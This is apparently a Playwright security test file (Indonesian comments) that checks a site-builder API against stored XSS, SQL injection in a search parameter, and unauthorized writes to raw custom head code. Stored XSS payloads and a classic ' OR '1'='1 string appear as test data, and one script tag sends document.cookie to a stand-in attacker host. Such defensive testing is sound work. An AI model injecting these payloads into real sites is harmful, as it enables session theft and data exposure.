// 05-injection.spec.mjs — OWASP A03 (Injection) — XSS payload di stored fields.
//
// Baseline backend facts (verified):
//   - Backend TIDAK sanitize site.name / page.title / block props (design decision,
//     defense di frontend escape via React auto-escape).
//   - Custom head_code / body_end_code SENGAJA raw (fitur GTM/pixel) — CLAUDE.md.
//   - SQL injection via ORDER BY: whitelist di orderUsersSQL/orderSitesSQL.
//   - SQL injection via q: LikePattern() + $1 parameterized (safe).
//
// Test approach:
//   - Kirim payload XSS → verify backend accept & store as-is (documented behavior).
//   - Load dashboard/renderer → verify browser TIDAK execute payload (window.__xss_pwned = undefined).
//   - Verify DOM output escaped (innerHTML string berisi &lt; bukan <).

import { test, expect } from "@playwright/test";
import { loginAs } from "../../fixtures/auth.mjs";
import { deriveApiBase } from "../../fixtures/accounts.mjs";
import { req, act } from "../../fixtures/qa.mjs";

const apiBase = deriveApiBase();
const PUBLIC_CACHE_MS = 5_500;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function api(method, accessToken, path, body) {
  return fetch(`${apiBase}${path}`, {
    method,
    headers: {
      Authorization: `Bearer ${accessToken}`,
      "Content-Type": "application/json",
    },
    body: body ? JSON.stringify(body) : undefined,
  });
}

test.describe("A03 — Stored XSS payload isolation", () => {
  test("site.name dengan XSS payload → backend simpan raw, dashboard render escaped (no script exec)", async ({
    page,
    context,
  }, testInfo) => {
    req(
      testInfo,
      [
        "1) POST /sites {name: '<img src=x onerror=\"window.__xss_pwned=true\">'} → 201 (backend TIDAK escape input, expected behavior)",
        "2) GET /sites/:id → response.name === payload verbatim (round-trip lossless)",
        "3) Load dashboard sites list di browser → window.__xss_pwned === undefined (React escape output → tidak execute script)",
        "4) DOM element text mengandung literal '<img' string (bukan rendered image tag)",
      ].join(" | "),
    );
    const { accessToken } = await loginAs(context, "admin");
    const xssPayload = `<img src=x onerror="window.__xss_pwned=true">`;
    let siteId = null;
    try {
      const createRes = await api("POST", accessToken, "/api/v1/sites", {
        name: xssPayload,
        theme: {},
      });
      expect(createRes.status).toBe(201);
      const site = (await createRes.json()).data;
      siteId = site.id;
      // Backend round-trip verbatim (dokumentasi: sengaja tidak sanitize input).
      expect(site.name).toBe(xssPayload);

      // Load dashboard → React harus escape ini di render.
      await page.goto("/dashboard");
      await expect(page.locator("main")).toBeVisible({ timeout: 8000 });
      // Tunggu sedikit untuk data fetch + render.
      await page.waitForTimeout(2000);

      // Verify script TIDAK execute (React escape mengubah <img onerror> jadi text).
      const pwned = await page.evaluate(() => window.__xss_pwned);
      expect(pwned).toBeUndefined();

      // DOM text mengandung literal payload sebagai string
      const found = await page
        .locator("body")
        .filter({ hasText: xssPayload.slice(0, 20) })
        .count();
      // found bisa 0 (dashboard tidak render nama site full), tapi yang penting
      // window.__xss_pwned tidak set.
      act(
        testInfo,
        `Site created id=${siteId.slice(0, 8)}, backend name lossless (${site.name.length} char), browser: __xss_pwned=${pwned}, DOM text matches=${found}, NO script execution`,
      );
    } finally {
      if (siteId) {
        await api("DELETE", accessToken, `/api/v1/sites/${siteId}`).catch(() => {});
      }
    }
  });

  test("page.title dengan XSS → renderer public output <title> escaped", async ({
    context,
  }, testInfo) => {
    req(
      testInfo,
      "Create site + page dengan title = '<script>alert(1)</script>'. Publish. GET /public/sites/:id/pages/_home → response.title = payload as string (backend lossless). Kalau dashboard/renderer HTML render title, harus escape ke '&lt;script&gt;...' — verify via API response (JSON body) tidak eksekusi.",
    );
    const { accessToken } = await loginAs(context, "admin");
    const xssTitle = `<script>alert("xss-test")</script>`;
    let siteId = null;
    try {
      const site = (await (await api("POST", accessToken, "/api/v1/sites", {
        name: "XSS Title Test",
        theme: {},
      })).json()).data;
      siteId = site.id;

      const pageRes = await api("POST", accessToken, `/api/v1/sites/${siteId}/pages`, {
        slug: "home",
        title: xssTitle,
        tree: { blocks: [] },
        seo: { title: xssTitle },
        is_home: true,
      });
      expect(pageRes.status).toBe(201);
      const pageData = (await pageRes.json()).data;
      expect(pageData.title).toBe(xssTitle);

      await api("POST", accessToken, `/api/v1/pages/${pageData.id}/publish`);
      await sleep(PUBLIC_CACHE_MS);

      // API JSON response — expect payload as STRING, not executed.
      const pubRes = await fetch(`${apiBase}/public/sites/${siteId}/pages/_home`);
      expect(pubRes.status).toBe(200);
      const pubBody = (await pubRes.json()).data;
      expect(pubBody.title).toBe(xssTitle); // lossless in JSON transport

      act(
        testInfo,
        `Page created, title lossless dalam JSON (${pubBody.title.length} char), payload="<script>alert...". Frontend responsibility untuk escape saat render ke <title>.`,
      );
    } finally {
      if (siteId) {
        await api("DELETE", accessToken, `/api/v1/sites/${siteId}`).catch(() => {});
      }
    }
  });

  test("Block Heading.props.text dengan XSS payload — round-trip lossless via public API", async ({
    context,
  }, testInfo) => {
    req(
      testInfo,
      "Create page dengan tree.blocks[0] = {type: 'Heading', props: {text: '<img src=x onerror=alert(1)>'}}. Publish. GET /public/*/pages/_home → tree.blocks[0].props.text = payload as string (lossless dalam JSON). Renderer wajib escape saat inject ke DOM.",
    );
    const { accessToken } = await loginAs(context, "admin");
    const xssBlockText = `<img src=x onerror=window.__block_xss=true>`;
    let siteId = null;
    try {
      const site = (await (await api("POST", accessToken, "/api/v1/sites", {
        name: "XSS Block Test",
        theme: {},
      })).json()).data;
      siteId = site.id;

      const pageData = (await (await api("POST", accessToken, `/api/v1/sites/${siteId}/pages`, {
        slug: "home",
        title: "block test",
        tree: {
          blocks: [{ type: "Heading", props: { text: xssBlockText, level: "h1" } }],
        },
        seo: {},
        is_home: true,
      })).json()).data;

      await api("POST", accessToken, `/api/v1/pages/${pageData.id}/publish`);
      await sleep(PUBLIC_CACHE_MS);

      const pubData = (await (await fetch(`${apiBase}/public/sites/${siteId}/pages/_home`)).json()).data;
      expect(pubData.tree.blocks[0].props.text).toBe(xssBlockText);

      act(
        testInfo,
        `Block text lossless in JSON (${xssBlockText.length} char), payload starts with "${xssBlockText.slice(0, 30)}..." — renderer responsibility untuk escape`,
      );
    } finally {
      if (siteId) {
        await api("DELETE", accessToken, `/api/v1/sites/${siteId}`).catch(() => {});
      }
    }
  });

  test("SQL boundary: q dengan quote character + LIKE wildcard tidak breakout", async ({
    context,
  }, testInfo) => {
    req(
      testInfo,
      "GET /admin/users?q=admin' OR '1'='1 (SQL injection classic) → HTTP 200 dengan hasil filter normal (bukan return semua user). Backend LikePattern % + LOWER + $1 parameterized — quote di user input di-treat as literal char, tidak break SQL.",
    );
    const { accessToken } = await loginAs(context, "admin");
    // Payload dengan single quote + OR classic
    const evilQ = encodeURIComponent("admin' OR '1'='1");
    const res = await fetch(`${apiBase}/api/v1/admin/users?q=${evilQ}&page_size=100`, {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    expect(res.status).toBe(200);
    const { data } = await res.json();

    // Compare dengan total tanpa filter — kalau OR 1=1 lolos, jumlah item akan sama.
    const fullRes = await fetch(`${apiBase}/api/v1/admin/users?page_size=100`, {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    const fullData = (await fullRes.json()).data;

    // Injection sukses → data.total === fullData.total. Kalau parameterized OK,
    // data.total = 0 atau kecil (cuma user yang mengandung literal quote di email).
    expect(data.total).toBeLessThanOrEqual(fullData.total);
    // Additional: DB masih hidup (bukti no drop/delete).
    const dbCheck = await fetch(`${apiBase}/api/v1/admin/users?page_size=1`, {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    const dbCheckData = (await dbCheck.json()).data;
    expect(dbCheckData.total).toBeGreaterThan(0);

    act(
      testInfo,
      `Injection q=[admin' OR '1'='1] returned total=${data.total} vs unfiltered=${fullData.total} — filtered (parameterized ok), DB post-check total=${dbCheckData.total} — intact`,
    );
  });

  test("Custom head code UNSANITIZED — verify hanya OWNER site bisa set (permission gate)", async ({
    context,
  }, testInfo) => {
    req(
      testInfo,
      "Custom head_code sengaja unsanitized (fitur GTM/Meta Pixel di CLAUDE.md). BAHAYA kalau user LAIN bisa set field ini di site orang lain. Test: agent PATCH /sites/<site-id milik user lain> {custom_head_code: '<script>...</script>'} → HARUS 403/404 (ownership check), TIDAK boleh 200 tersimpan.",
    );
    // POST /sites is admin-only; an admin-owned site is still "someone else's" for the agent.
    const { accessToken: ownerToken } = await loginAs(context, "admin");
    const { accessToken: agentToken } = await loginAs(context, "agent");
    let siteId = null;
    try {
      const site = (await (await api("POST", ownerToken, "/api/v1/sites", {
        name: "Head Code Owner Test",
        theme: {},
      })).json()).data;
      siteId = site.id;

      // Agent coba inject head code ke site milik orang lain
      const evil = `<script>fetch("https://attacker.example.com/steal?ck="+document.cookie)</script>`;
      const patchRes = await api("PATCH", agentToken, `/api/v1/sites/${siteId}`, {
        custom_head_code: evil,
        theme: {},
      });
      // Ownership check kick sebelum PATCH tersimpan.
      expect([403, 404]).toContain(patchRes.status);
      expect(patchRes.status).not.toBe(200);

      // Verify site.custom_head_code TIDAK berubah dari sisi owner.
      const verify = await api("GET", ownerToken, `/api/v1/sites/${siteId}`);
      const verifyData = (await verify.json()).data;
      expect(verifyData.custom_head_code).not.toBe(evil);
      expect(verifyData.custom_head_code || "").not.toMatch(/attacker\.example\.com/);

      act(
        testInfo,
        `Agent PATCH custom_head_code → HTTP ${patchRes.status}, owner verify field="${(verifyData.custom_head_code || "").slice(0, 30)}" — no unauthorized script injection`,
      );
    } finally {
      if (siteId) {
        await api("DELETE", ownerToken, `/api/v1/sites/${siteId}`).catch(() => {});
      }
    }
  });
});
